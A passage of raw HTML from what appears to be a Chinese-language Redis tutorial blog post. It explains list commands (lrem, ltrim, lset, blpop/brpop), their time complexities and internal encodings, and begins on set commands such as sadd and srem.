class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nrpop key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089272522027230-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089272522027230-1\"><span class=\"crayon-e\">rpop </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/bc356eafeace8a51c92a28a4143ec7af.png\" width=\"437\" height=\"383\"></p>\n<p>rpop 命令和 lpop 命令的使用方式一样。</p>\n<ul>\n<li>删除指定元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089275168534083\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlrem key count value</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089275168534083-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089275168534083-1\"><span class=\"crayon-e\">lrem </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">count </span><span class=\"crayon-v\">value</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>lrem 命令会将列表中等于 value 的元素删除掉，并且会根据 count 参数来决定删除 value 的元素个数。</p>\n<p>下面我们看一下 count 参数的使用说明：</p>\n<p><strong>count &gt; 0</strong>：表示从左到右，最多删除 count 个元素。也就是如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/f5c7100c526bee912803ef6d50cde68c.png\" width=\"396\" height=\"466\"></p>\n<p>我们看上图中的命令中，虽然我们将 count 参数指定的是 5，将 value 参数指定的是 2，但由于当前列表中只有一个 2，所以，当前 lrem 命令最多只能删除 1 个元素，并且 lrem 命令也是有返回值的，也就是当前成功删除元素的个数。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/2949da72e50327cecaa7a09ad1e5f2f9.png\" width=\"405\" height=\"514\"></p>\n<p><strong>count &lt; 0：从右到左，最多删除 count 个元素。</strong></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/afdb2e49ce743e86b017e4410046b646.png\" width=\"645\" height=\"524\"></p>\n<p><strong>count = 0</strong>：删除所有元素。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/74df93d41e17354015d289e0c8656398.png\" width=\"464\" height=\"603\"></p>\n<ul>\n<li>按照索引范围修剪列表</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08927b201933891\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nltrim key start stop</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08927b201933891-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08927b201933891-1\"><span class=\"crayon-e\">ltrim </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">start </span><span class=\"crayon-v\">stop</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>ltrim 命令会直接保留 start 索引到 stop 索引的之间的元素，并包括当前元素，而之外的元素则都会删除掉，所以该命令也叫修剪列表。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/f8ca0f5756da5535cafb219ec17989a4.png\" width=\"385\" height=\"366\"></p>\n<p>并且有一点要注意，ltrim 命令不会返回当前的列表中元素的个数，而是返回改命令是否成功的状态。</p>\n<p> </p>\n<h3>4.修改</h3>\n<ul>\n<li>修改指定索引下标的元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08927f748749785\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlset key index value</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08927f748749785-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08927f748749785-1\"><span class=\"crayon-e\">lset </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">index </span><span class=\"crayon-v\">value</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/67c400e678459565120f1e4d282a53af.png\" width=\"394\" height=\"323\"></p>\n<p> </p>\n<h3>5.阻塞操作</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089282061183093\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nblpop key [key ...] timeout\r\nbrpop key [key ...] timeout</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089282061183093-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089282061183093-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089282061183093-1\"><span class=\"crayon-e\">blpop </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">timeout</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089282061183093-2\"><span class=\"crayon-e\">brpop </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeout</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>blpop 和 brpop 命令是 lpop 和 rpop 命令的阻塞版本，它们除了弹出方向不同以外，使用方法基本相同。</p>\n<ul>\n<li>key [key …]：可以指定多个列表的键。</li>\n<li>timeout：阻塞时间（单位：秒）</li>\n</ul>\n<p>下面我们看一下该命令的详细使用。</p>\n<p><strong>列表为空</strong>：如果 timeout=3，则表示客户端等待 3 秒后才能返回结果，如果 timeout=0，则表示客户端会一直等待，也就是会阻塞。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/9c54f738c0af51fb413a3989255bd9e7.png\" width=\"513\" height=\"217\"></p>\n<p>由于我期间向列表中插入了元素，否则上述命令将一直阻塞下去。</p>\n<p><strong>列表不为空</strong>：如果 timeout=0，并且列表不为空时，则 blpop 和 brpop 命令会立即返回结果，不会阻塞。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/40cde915c1b054294c650b89890b1b15.png\" width=\"423\" height=\"128\"></p>\n<p>下面我们看一下 blpop 和 brpop 命令的注意事项。</p>\n<p>如果使用 blpop 和 brpop 命令指定多个键时，blpop 和 brpop 命令会从左到右遍历键，并且一旦有一个键能返回元素，则客户端会立即返回。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/2a6c7c0126fd35db013ca276b2c99785.png\" width=\"516\" height=\"112\"></p>\n<p>当列表为空时，上述命令会阻塞，如果向上述中的任何一个键中插入元素，则上述命令会直接返回该键的元素。</p>\n<p>如果多个客户端都对同一个键执行 blpop 或者 brpop 命令，则最先执行该命令的客户端会获取到该键的元素。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/6590874dbcb021ca5d030011d26a91e6.png\" width=\"762\" height=\"319\"></p>\n<p>我同时启动了 3 个客户端，因为当前列表为空，所以上述命令执行后会阻塞。如果此时我向该列表中插入元素，则只有第一个客户端会有返回结果，因为第一个客户端是第一个执行上述命令的。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/02244756b88a2467de2738e9e523c8d6.png\" width=\"754\" height=\"333\"></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/b238364336f7aa1883555a4040773491.png\" width=\"722\" height=\"321\"></p>\n<p> </p>\n<h2>时间复杂度</h2>\n<p>下面我们看一下列表中命令的相关时间复杂度。</p>\n<table cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>操作类型</td>\n<td>命令</td>\n<td>时间复杂度</td>\n</tr>\n<tr>\n<td>添加</td>\n<td>rpush key value [value …]</td>\n<td>O(k)，k是元素的个数</td>\n</tr>\n<tr>\n<td>添加</td>\n<td>lpush key value [value …]</td>\n<td>O(k)，k是元素的个数</td>\n</tr>\n<tr>\n<td>添加</td>\n<td>linsert key BEFORE/AFTER pivot value</td>\n<td>O(n)，n是pivot距离列表头或者尾的距离</td>\n</tr>\n<tr>\n<td>查找</td>\n<td>lrange key start stop</td>\n<td>O(s + n)，s是start偏移量，n是start到stop的范围</td>\n</tr>\n<tr>\n<td>查找</td>\n<td>lindex key index</td>\n<td>O(n)，n是索引的偏移量</td>\n</tr>\n<tr>\n<td>查找</td>\n<td>llen key</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>删除</td>\n<td>lpop key</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>删除</td>\n<td>rpop key</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>删除</td>\n<td>lrem key count value</td>\n<td>O(n)，n是列表长度</td>\n</tr>\n<tr>\n<td>删除</td>\n<td>ltrim key start stop</td>\n<td>O(n)，n是要裁剪的元素个数</td>\n</tr>\n<tr>\n<td>修改</td>\n<td>lset key index value</td>\n<td>O(n)，n是索引的偏移量</td>\n</tr>\n<tr>\n<td>阻塞操作</td>\n<td>blpop/brpop key [key …] timeout</td>\n<td>O(1)</td>\n</tr>\n</tbody>\n</table>\n<p> </p>\n<h2>内部编码</h2>\n<p>列表中的内部编码有两种，它们分别是：</p>\n<ul>\n<li>ziplist（压缩列表）：当列表中元素个数小于 512（默认）个，并且列表中每个元素的值都小于 64（默认）个字节时，Redis 会选择用 ziplist 来作为列表的内部实现以减少内存的使用。当然上述默认值也可以通过相关参数修改：list-max-ziplist-entried（元素个数）、list-max-ziplist-value(元素值)。</li>\n<li>linkedlist（链表）：当列表类型无法满足 ziplist 条件时，Redis 会选择用 linkedlist 作为列表的内部实现。</li>\n</ul>\n<p> </p>\n<h1>集合类型</h1>\n<p>Redis 中的集合类型，也就是 set。在 Redis 中 set 也是可以保存多个字符串的，经常有人会分不清 list 与 set，下面我们重点介绍一下它们之间的不同：</p>\n<ul>\n<li>set 中的元素是不可以重复的，而 list 是可以保存重复元素的。</li>\n<li>set 中的元素是无序的，而 list 中的元素是有序的。</li>\n<li>set 中的元素不能通过索引下标获取元素，而 list 中的元素则可以通过索引下标获取元素。</li>\n<li>除此之外 set 还支持更高级的功能，例如多个 set 取交集、并集、差集等。</li>\n</ul>\n<p> </p>\n<h2>命令</h2>\n<p>下面我们介绍一下 set 中的相关命令。</p>\n<p> </p>\n<h3>1.集合内操作</h3>\n<ul>\n<li>添加元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089289968673326\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsadd key member [member ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089289968673326-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089289968673326-1\"><span class=\"crayon-e\">sadd </span><span class=\"crayon-e\">key </span><span class=\"crayon-i\">member</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">member</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/f97d3718b1138ffaebe4e1dde241a392.png\" width=\"412\" height=\"147\"></p>\n<p>sadd 命令也是有返回值的，它的返回值就是当前执行 sadd 命令成功添加元素的个数，因为 set 中不能保存重复元素，所以在执行 <strong>sadd setkey c d</strong> 命令时，返回的是 1，而不是 2。因为元素 c 已经成功保存到 set 中，不能再保存了，只能将 d 保存到 set 中。</p>\n<ul>\n<li>删除元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08928f884118331\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsrem key member [member ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08928f884118331-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08928f884118331-1\"><span class=\"crayon-e\">srem </span><span class=\"crayon-e\">key </span><span class=\"crayon-i\">member</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">member</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/d116239ca08aa5ad2ca3e2d91afe145d.png\" width=\"337\" height=\"106\"></p>\n<p>srem 命令和 sadd 命令一样也是有返回值的，返回值就是当前删除元素的个数。</p>\n<ul>\n<li>计算元素个数</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08929d001980802\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 